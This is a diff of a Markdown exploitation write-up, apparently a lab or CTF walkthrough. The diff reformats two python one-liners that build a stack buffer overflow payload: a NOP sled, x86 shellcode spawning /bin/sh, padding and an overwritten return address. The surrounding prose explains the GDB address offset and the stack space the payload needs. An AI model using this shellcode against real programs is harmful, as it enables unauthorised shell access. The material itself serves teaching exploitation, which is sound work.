@@ -161,13 +161,16 @@ Illegal instruction (core dumped)
 
 
 - It doesn't work, indeed, the environment is slightly different between a program launched with/without GDB. That's why the exact address we are targeting isn't exactly the same. We therefore need to find the correct address. By adding [NOP instructions](https://fr.wikipedia.org/wiki/NOP) before our shellcode, we can make the address search less laborious. We would then be tempted to do it like this:
->`python -c "print '\x90'*49 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + '\xd0\xf6\xff\xbf'"`
+```
+python -c "print '\x90'*49 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + '\xd0\xf6\xff\xbf'"
+```
 
 
 - But since our shellcode is stored directly in the stack, and `esp` is at that moment of program execution at the level of the previous stack frame, our instructions `push $0x68732f2f` and `push 0x6e69622f` would corrupt our shellcode, and it wouldn't work.
 So, we need to keep a bit of space, precisely 8 bytes:
->`python -c "print '\x90'*41 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + 'a'*8 + '\xd0\xf6\xff\xbf'"`
-
+```
+python -c "print '\x90'*41 + '\x31\xf6\x31\xff\x31\xc9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\xb0\x0b\xcd\x80' + 'a'*8 + '\xd0\xf6\xff\xbf'"
+```
 
 - Thus, thanks to these NOP instructions, the execution of our shellcode will be able to succeed from a broader range of addresses.
 ```
